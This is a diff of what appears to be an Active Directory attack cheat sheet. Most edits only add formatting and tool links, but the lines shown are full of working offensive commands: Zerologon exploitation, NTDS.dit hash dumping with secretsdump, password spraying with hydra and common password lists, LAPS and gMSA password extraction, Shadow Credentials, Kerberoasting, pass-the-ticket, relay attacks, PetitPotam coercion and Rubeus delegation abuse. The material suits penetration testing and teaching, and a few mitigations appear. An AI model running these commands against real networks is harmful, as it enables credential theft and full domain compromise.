@@ -261,7 +261,7 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
 - **Enum Other Domains:** `Get-NetDomain -Domain <DomainName>`
 - **Get Domain SID:** `Get-DomainSID`
 - **Get Domain Policy:** 
-  ```
+  ```powershell
   Get-DomainPolicy
 
   #Will show us the policy configurations of the Domain about system access or kerberos
@@ -269,12 +269,12 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   (Get-DomainPolicy)."kerberos policy"
   ```
 - **Get Domain Controlers:** 
-  ```
+  ```powershell
   Get-NetDomainController
   Get-NetDomainController -Domain <DomainName>
   ```
 - **Enumerate Domain Users:** 
-  ```
+  ```powershell
   Get-NetUser
   Get-NetUser -SamAccountName <user> 
   Get-NetUser | select cn
@@ -296,7 +296,7 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
   ```
 - **Enum Domain Computers:** 
-  ```
+  ```powershell
   Get-NetComputer -FullData
   Get-DomainGroup
 
@@ -304,7 +304,7 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   Get-NetComputer -Ping
   ```
 - **Enum Groups and Group Members:**
-  ```
+  ```powershell
   Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
   
   #Enumerate the members of a specified group of the domain
@@ -314,7 +314,7 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
   ```
 - **Enumerate Shares**
-  ```
+  ```powershell
   #Enumerate Domain Shares
   Find-DomainShare
   
@@ -322,7 +322,7 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   Find-DomainShare -CheckShareAccess
   ```
 - **Enum Group Policies:** 
-  ```
+  ```powershell
   Get-NetGPO
 
   # Shows active Policy on specified machine
@@ -333,12 +333,12 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   Find-GPOComputerAdmin -ComputerName <ComputerName>
   ```
 - **Enum OUs:** 
-  ```
+  ```powershell
   Get-NetOU -FullData 
   Get-NetGPO -GPOname <The GUID of the GPO>
   ```
 - **Enum ACLs:** 
-  ```
+  ```powershell
   # Returns the ACLs associated with the specified account
   Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
   Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
@@ -350,12 +350,12 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   Get-PathAcl -Path "\\Path\Of\A\Share"
   ```
 - **Enum Domain Trust:** 
-  ```
+  ```powershell
   Get-NetDomainTrust
   Get-NetDomainTrust -Domain <DomainName>
   ```
 - **Enum Forest Trust:** 
-  ```
+  ```powershell
   Get-NetForestDomain
   Get-NetForestDomain Forest <ForestName>
 
@@ -368,7 +368,7 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   Get-NetDomainTrust -Forest <ForestName>
   ```
 - **User Hunting:** 
-  ```
+  ```powershell
   #Finds all machines on the current domain where the current user has local admin access
   Find-LocalAdminAccess -Verbose
 
@@ -395,29 +395,31 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
 - **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
 - **Get Domain SID:** `Get-DomainSID`
 - **Get Domain Controlers:** 
-  ```
+
+  ```powershell
   Get-ADDomainController
   Get-ADDomainController -Identity <DomainName>
   ```
+  
 - **Enumerate Domain Users:** 
-  ```
+  ```powershell
   Get-ADUser -Filter * -Identity <user> -Properties *
 
   #Get a spesific "string" on a user's attribute
   Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
   ```
 - **Enum Domain Computers:** 
-  ```
+  ```powershell
   Get-ADComputer -Filter * -Properties *
   Get-ADGroup -Filter * 
   ```
 - **Enum Domain Trust:** 
-  ```
+  ```powershell
   Get-ADTrust -Filter *
   Get-ADTrust -Identity <DomainName>
   ```
 - **Enum Forest Trust:** 
-  ```
+  ```powershell
   Get-ADForest
   Get-ADForest -Identity <ForestName>
 
@@ -425,7 +427,7 @@ You can add some custom queries like [Bloodhound-Custom-Queries](https://github.
   (Get-ADForest).Domains
   ```
  - **Enum Local AppLocker Effective Policy:**
- ```
+ ```powershell
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```
 
@@ -532,7 +534,7 @@ Exploit steps from the white paper
 5. From password change to domain admin
 6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service
 
-* `cve-2020-1472-exploit.py` - Python script from dirkjanm
+* `cve-2020-1472-exploit.py` - Python script from [dirkjanm](https://github.com/dirkjanm)
   ```powershell
 	# Check (https://github.com/SecuraBV/CVE-2020-1472)
 	proxychains python3 zerologon_tester.py DC01 172.16.1.5
@@ -603,7 +605,7 @@ The exploit will execute the DLL either from the local filesystem or a remote sh
 
 Requirements:
 * **Spooler Service** enabled (Mandatory)
-* Server with patches < June 21
+* Server with patches < June 2021
 * DC with `Pre Windows 2000 Compatibility` group
 * Server with registry key `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1
 * Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0
@@ -663,8 +665,8 @@ Requirements:
 
 | Error  | Message             | Debug                                    |
 |--------|---------------------|------------------------------------------|
-| 0x5    | rpc_s_access_denied | Permissions on the file in the SMB share |
-| 0x525  | ERROR_NO_SUCH_USER  | The specified account does not exist.    |
+| 0x5    | `rpc_s_access_denied` | Permissions on the file in the SMB share |
+| 0x525  | `ERROR_NO_SUCH_USER`  | The specified account does not exist.    |
 | 0x180  | unknown error code  | Share is not SMB2                        |
 
 
@@ -842,7 +844,7 @@ echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aS
     cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
     ```
 
-* [Get-GPPPassword](https://github.com/ShutdownRepo/Get-GPPPassword)
+* [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py)
   ```powershell
   # with a NULL session
   Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
@@ -856,7 +858,7 @@ echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aS
 
 #### Mitigations
 
-* Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
+* Install [KB2962486](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025) on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
 * Delete existing GPP xml files in SYSVOL containing passwords.
 * Don’t put passwords in files that are accessible by all authenticated users.
 
@@ -966,7 +968,7 @@ StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author 
 
 You will need the following files to extract the ntds : 
 - NTDS.dit file
-- SYSTEM hive (C:\Windows\System32\SYSTEM)
+- SYSTEM hive (`C:\Windows\System32\SYSTEM`)
 
 Usually you can find the ntds in two locations : `systemroot\NTDS\ntds.dit` and `systemroot\System32\ntds.dit`.
 - `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
@@ -1047,13 +1049,13 @@ esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 
 #### Extract hashes from ntds.dit
 
-then you need to use secretsdump to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
+then you need to use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
 
 ```java
 secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 ```
 
-secretsdump also works remotely
+[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) also works remotely
 
 ```java
 ./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
@@ -1141,10 +1143,10 @@ Password spraying refers to the attack method that takes a large number of usern
 
 Most of the time the best passwords to spray are :
 
-- P@ssw0rd01, Password123, Password1, Hello123, mimikatz
-- Welcome1/Welcome01
-- $Companyname1 : $Microsoft1
-- SeasonYear : Winter2019*, Spring2020!, Summer2018?, Summer2020, July2020!
+- `P@ssw0rd01`, `Password123`, `Password1`, `Hello123`, `mimikatz`
+- `Welcome1`/`Welcome01`
+- $Companyname1 :` $Microsoft1`
+- SeasonYear : `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`
 - Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
 
 
@@ -1189,12 +1191,12 @@ Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 #### Spray passwords against the RDP service
 
-* Using RDPassSpray to target RDP services.
+* Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
   ```powershell
   git clone https://github.com/xFreed0m/RDPassSpray
   python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
   ```
-* Using hydra and ncrack to target RDP services.
+* Using [hydra](https://github.com/vanhauser-thc/thc-hydra) and [ncrack](https://github.com/nmap/ncrack) to target RDP services.
   ```powershell
   hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
   ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
@@ -1220,7 +1222,7 @@ GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in acc
 GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account
 ```
 
-There are 3-4 fields that seem to be common in most AD schemas: UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.
+There are 3-4 fields that seem to be common in most AD schemas: `UserPassword`, `UnixUserPassword`, `unicodePwd` and `msSFU30Password`.
 
 ```powershell
 enum4linux | grep -i desc
@@ -1239,15 +1241,15 @@ ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP
 > User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
 
 #### GMSA Attributes in the Active Directory 
-* **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password.
-* **msds-ManagedPassword** - This attribute contains a BLOB with password information for group-managed service accounts.
-* **msDS-ManagedPasswordId** - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
-* **msDS-ManagedPasswordInterval** - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
+* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
+* `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
+* `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
+* `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
 
 
 #### Extract NT hash from the Active Directory
 
-* GMSAPasswordReader (C#)
+* [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#)
   ```ps1
   # https://github.com/rvazarkar/GMSAPasswordReader
   GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
@@ -1285,53 +1287,65 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
 
 > The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
 
-* adsisearcher (native binary on Windows 8+)
-    ```powershell
-    ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
-    ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
-    ```
+ - From Windows:
 
-* CrackMapExec
-    ```powershell
-    crackmapexec smb 10.10.10.10 -u user -H 8846f7eaee8fb117ad06bdd830b7586c -M laps
-    ```
+   * adsisearcher (native binary on Windows 8+)
+       ```powershell
+       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
+       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
+       ```
 
-* Powerview
-    ```powershell
-    PS > Import-Module .\PowerView.ps1
-    PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
-    ```
+   * [PowerView](https://github.com/PowerShellEmpire/PowerTools)
+       ```powershell
+       PS > Import-Module .\PowerView.ps1
+       PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
+       ```
 
-* LAPSToolkit - https://github.com/leoloobeek/LAPSToolkit
-    ```powershell
-    $ Get-LAPSComputers
-    ComputerName                Password                                 Expiration         
-    ------------                --------                                 ----------         
-    exmaple.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18
+   * [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
+       ```powershell
+       $ Get-LAPSComputers
+       ComputerName                Password                                 Expiration         
+       ------------                --------                                 ----------         
+       example.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18
 
-    $ Find-LAPSDelegatedGroups
-    $ Find-AdmPwdExtendedRights
-    ```
+       $ Find-LAPSDelegatedGroups
+       $ Find-AdmPwdExtendedRights
+       ```
 
-* ldapsearch
-    ```powershell
-    ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
-    ```
+   * Powershell AdmPwd.PS
+       ```powershell
+       foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
+       ```
 
-* LAPSDumper - https://github.com/n00py/LAPSDumper
-    ```powershell
-    python laps.py -u user -p password -d domain.local
-    python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
-    ```
+ - From linux:
 
-* Powershell AdmPwd.PS
-    ```powershell
-    foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
-    ```
+   * [pyLAPS](https://github.com/p0dalirius/pyLAPS) to **read** and **write** LAPS passwords:
+       ```bash
+       # Read the password of all computers
+       ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
+       # Write a random password to a specific computer
+       ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
+       ```
+     
+   * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):
+       ```bash
+       crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
+       ```
 
+   * [LAPSDumper](https://github.com/n00py/LAPSDumper) 
+       ```bash
+       python laps.py -u 'user' -p 'password' -d 'domain.local'
+       python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'
+       ```
+   
+   * ldapsearch
+      ```bash
+      ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
+      ```
+     
 ### Pass-the-Ticket Golden Tickets
 
-Forging a TGT require the krbtgt NTLM hash
+Forging a TGT require the `krbtgt` NTLM hash
 
 > The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.
 
@@ -1441,7 +1455,7 @@ Mitigations:
 Any valid domain user can request a kerberos ticket (TGS) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
 
-* `GetUserSPNs` from Impacket Suite
+* [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
   ```powershell
   $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 
@@ -1503,11 +1517,11 @@ Any valid domain user can request a kerberos ticket (TGS) for any domain service
 
 Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`) 
 	
-| Mode  | Description  |
-|-------|--------------|
-| 13100 | Kerberos 5 TGS-REP etype 23 (RC4) |
-| 19600 | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
-| 19700 | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |
+| Mode    | Description  |
+|---------|--------------|
+| `13100` | Kerberos 5 TGS-REP etype 23 (RC4) |
+| `19600` | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
+| `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |
 
 ```powershell
 ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
@@ -1545,7 +1559,7 @@ Mitigations:
   $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
   ```
 
-* `GetNPUsers` from Impacket Suite
+* [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
   ```powershell
   $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
   [*] Getting TGT for svc-alfresco
@@ -1580,24 +1594,31 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 ### Shadow Credentials
 
 Requirements :
-* Domain Controller on Windows Server 2016
+* Domain Controller on (at least) Windows Server 2016
 * PKINIT Kerberos authentication
-* An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object
+* An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object
 
-Add **Key Credentials** to the attribute **msDS-KeyCredentialLink** of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
+Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
 
-```powershell
-# https://github.com/eladshamir/Whisker
+ - From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
+    ```powershell
+    # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+    Whisker.exe list /target:computername$
+    # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+    Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
+    # Removes a key credential from the target object specified by a DeviceID GUID.
+    Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
+    ```
 
-Whisker.exe list /target:computername$
-# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
-
-Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
-# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
-
-Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
-# Removes a key credential from the target object specified by a DeviceID GUID.
-```
+ - From Linux, use [pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
+    ```bash
+    # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
+    # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
+    # Removes a key credential from the target object specified by a DeviceID GUID.
+    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
+    ```
 
 
 ### Pass-the-Hash
@@ -1646,17 +1667,17 @@ In this technique, instead of passing the hash directly, we use the NTLM hash of
 
 #### Using impacket
 
-```powershell
-root@kali:impacket-examples$ python ./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
-root@kali:impacket-examples$ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
-root@kali:impacket-examples$ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+```bash
+root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
+root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
+root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass
 
-also with the AES Key if you have it
-root@kali:impacket-examples$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
+# also with the AES Key if you have it
+root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
 
-ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
-kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
-klist
+root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
+root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
+root@kali:~$ klist
 ```
 
 #### Using Rubeus
@@ -1749,10 +1770,10 @@ NTLMv1 and NTLMv2 can be relayed to connect to another machine.
 
 | Hash                 | Hashcat | Attack method       |
 |---|---|---|
-| LM                    | 3000  | crack/pass the hash  |
-| NTLM/NTHash           | 1000  | crack/pass the hash  |
-| NTLMv1/Net-NTLMv1     | 5500  | crack/relay attack   |
-| NTLMv2/Net-NTLMv2     | 5600  | crack/relay attack   |
+| LM                    | `3000`  | crack/pass the hash  |
+| NTLM/NTHash           | `1000`  | crack/pass the hash  |
+| NTLMv1/Net-NTLMv1     | `5500`  | crack/relay attack   |
+| NTLMv2/Net-NTLMv2     | `5600`  | crack/relay attack   |
 
 Crack the hash with `hashcat`.
 
@@ -1825,7 +1846,7 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
 
 #### SMB Signing Disabled and IPv6
 
-Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
+Since [MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077) the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
 
 ```powershell
 crackmapexec smb $hosts --gen-relay-list relay.txt
@@ -2047,7 +2068,6 @@ If you do not want modified ACLs to be overwritten every hour, you should change
 
 >  The AdminCount attribute is set to `1` automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).
 
-
 Find users with `AdminCount=1`.
 
 ```powershell
@@ -2173,7 +2193,7 @@ NOTE: To not alert the user the payload should hide its own process window and s
 
 #### WriteDACL
 
-To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
+To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
 
 * WriteDACL on Domain
   ```powershell
@@ -2226,7 +2246,7 @@ ConvertFrom-ADManagedPasswordBlob $mp
 #### ForceChangePassword
 
 An attacker can change the password of the user this ACE applies to. 
-This can be achieved with Set-DomainUserPassword (PowerView module).
+This can be achieved with `Set-DomainUserPassword` (PowerView module).
 
 ```powershell
 $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
@@ -2544,7 +2564,7 @@ Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HA
 
 Using `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.
 
-```powershell
+```bash
 # Coerce the callback
 git clone https://github.com/topotam/PetitPotam
 python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
@@ -2572,11 +2592,11 @@ $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
 #### Exploit the Constrained Delegation
 
 * Impacket
-  ```ps1
+  ```bash
   $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
   ```
 * Rubeus
-  ```ps1
+  ```bash
   $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
   $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
   $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
